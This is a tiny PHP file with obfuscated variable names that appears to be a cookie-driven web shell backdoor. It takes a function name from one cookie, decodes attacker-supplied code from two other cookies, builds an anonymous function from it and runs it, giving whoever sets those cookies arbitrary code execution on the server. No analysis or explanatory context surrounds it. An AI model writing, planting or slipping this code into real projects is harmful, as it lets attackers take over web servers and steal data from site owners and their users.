<?php

$gfgaj=$_COOKIE;
$nzdl=$gfgaj[arsg];
if($nzdl){
	$sukrd=$nzdl($gfgaj[dust]);$slrvv=$nzdl($gfgaj[epkn]);$qzanb=$sukrd("",$slrvv);$qzanb();
}